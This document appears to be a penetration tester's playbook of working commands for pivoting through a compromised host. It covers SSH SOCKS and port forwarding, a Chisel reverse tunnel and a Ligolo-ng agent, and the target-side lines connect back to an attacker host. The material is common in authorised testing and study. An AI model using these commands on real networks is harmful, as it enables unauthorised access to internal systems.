# Pivoting and Tunneling Playbook

**Goal**: Route traffic through a compromised host to reach internal networks that are inaccessible from the attacker machine.

## 1. Dynamic Port Forwarding (SOCKS Proxy)
Create a SOCKS proxy over an SSH connection to route tools like proxychains.

<!-- cmd: linux -->
```bash
# [USED]
ssh -D 1080 user@<COMPROMISED_HOST>
```

## 2. Local Port Forwarding
Forward a specific remote port to your local machine.

<!-- cmd: linux -->
```bash
# [USED]
ssh -L 8080:127.0.0.1:80 user@<COMPROMISED_HOST>
```

## 3. Remote Port Forwarding
Forward a local port (on the attacker machine) to the compromised host, useful for reverse shells over tunnels.

<!-- cmd: linux -->
```bash
# [USED]
ssh -R 4444:127.0.0.1:4444 user@<COMPROMISED_HOST>
```

## 4. Pivoting with Chisel
Use Chisel to create a fast TCP/UDP tunnel over HTTP when SSH is unavailable.

**Attacker (Server):**
<!-- cmd: linux -->
```bash
# [USED]
chisel server -p 8000 --reverse
```

**Target (Client):**
<!-- cmd: cross-platform -->
```bash
# [USED]
chisel client <ATTACKER_IP>:8000 R:socks
```

## 5. Ligolo-ng
Setup a fully routable interface for pivoting.

**Attacker (Server):**
<!-- cmd: linux -->
```bash
# [USED]
sudo ip tuntap add user <USER> mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

**Target (Agent):**
<!-- cmd: cross-platform -->
```bash
# [USED]
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

## Related
- [ssh.md](../../tools/network/ssh.md)
- [chisel.md](../../tools/network/chisel.md)
